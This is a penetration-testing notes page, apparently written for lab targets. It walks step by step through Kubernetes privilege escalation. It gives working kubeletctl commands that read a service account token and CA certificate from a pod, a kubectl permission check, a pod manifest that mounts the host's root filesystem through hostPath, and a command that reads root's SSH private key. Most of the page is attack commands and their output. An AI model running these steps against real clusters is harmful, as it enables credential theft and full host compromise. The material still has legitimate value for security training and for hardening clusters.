---
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: true
---

# Kubernetes

Kubernetes, also known as K8s, is a container orchestration system, which functions by running all applications in containers isolated from the host system through multiple layers of protection. This approach ensures that applications are not affected by changes in the host system, such as updates or security patches. The K8s architecture comprises a **master node** and **worker nodes**, each with specific roles.

Kubernetes architecture is primarily divided into two types of components:

* `The Control Plane` (master node), which is responsible for controlling the Kubernetes cluster
* `The Worker Nodes` (minions), where the containerised applications are run

### Privilege Escalation

To gain higher privileges and access the host system, we can utilise a tool called [kubeletctl.md](../../../../toolbox/tooling/exploitation-tools/service-exploitation-tools/kubeletctl.md "mention") to obtain the Kubernetes service account's `token` and `certificate` (`ca.crt`) from the server.

To do this, we must provide the server's IP address, namespace, and target pod. In case we get this token and certificate, we can elevate our privileges even more, move horizontally throughout the cluster, or gain access to additional pods and resources.

### Kubelet API - Extracting Tokens

{% code title="Command" overflow="wrap" %}
```bash
kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
```
{% endcode %}

{% code title="Example Output" %}
```bash
eyJhbGciOiJSUzI1NiIsImtpZC...SNIP...UfT3OKQH6Sdw
```
{% endcode %}

### Kubelet API - Extracting Certificates

{% code title="Command" overflow="wrap" %}
```bash
kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
```
{% endcode %}

{% code title="Example Output" %}
```bash
-----BEGIN CERTIFICATE-----
MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
<SNIP>
MhxgN4lKI0zpxFBTpIwJ3iZemSfh3pY2UqX03ju4TreksGMkX/hZ2NyIMrKDpolD
602eXnhZAL3+dA==
-----END CERTIFICATE-----
```
{% endcode %}

Now that we have both the `token` and `certificate`, we can check the access rights in the Kubernetes cluster. This is commonly used for auditing and verification to guarantee that users have the correct level of access and are not given more privileges than they need. However, we can use it for our purposes and we can inquire of K8s whether we have permission to perform different actions on various resources.

### List Privileges

{% code title="Command" %}
```bash
export token=`cat k8.token`
```
{% endcode %}

{% code title="Command" overflow="wrap" %}
```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
```
{% endcode %}

{% code title="Example Output" %}
```bash
Resources					Non-Resource URLs    Resource Names	Verbs 
selfsubjectaccessreviews.authorization.k8s.io	[]                   []			[create]
selfsubjectrulesreviews.authorization.k8s.io	[]                   []			[create]
pods						[]                   []			[get create list]
...SNIP...
```
{% endcode %}

Here we can see a few very important information. Besides the selfsubject-resources we can `get`, `create`, and `list` pods which are the resources representing the running container in the cluster. From here on, we can create a `YAML` file that we can use to create a new container and mount the entire root filesystem from the host system into this container's `/root` directory. From there on, we could access the host systems files and directories. The `YAML` file could look like following:

### Pod YAML

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

Once created, we can now create the new pod and check if it is running as expected.

### **Creating a new Pod**

{% code title="Command" overflow="wrap" %}
```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
```
{% endcode %}

{% code title="Example Output" %}
```bash
pod/privesc created
```
{% endcode %}

{% code title="Command" overflow="wrap" %}
```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods
```
{% endcode %}

{% code title="Example Output" %}
```bash
NAME	READY	STATUS	RESTARTS	AGE
nginx	1/1		Running	0	23m
privesc	1/1		Running	0	12s
```
{% endcode %}

If the pod is running we can execute the command and we could spawn a reverse shell or retrieve sensitive data like private SSH key from the root user.

### **Extracting Root's SSH Key**

{% code title="Command" %}
```bash
kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```
{% endcode %}
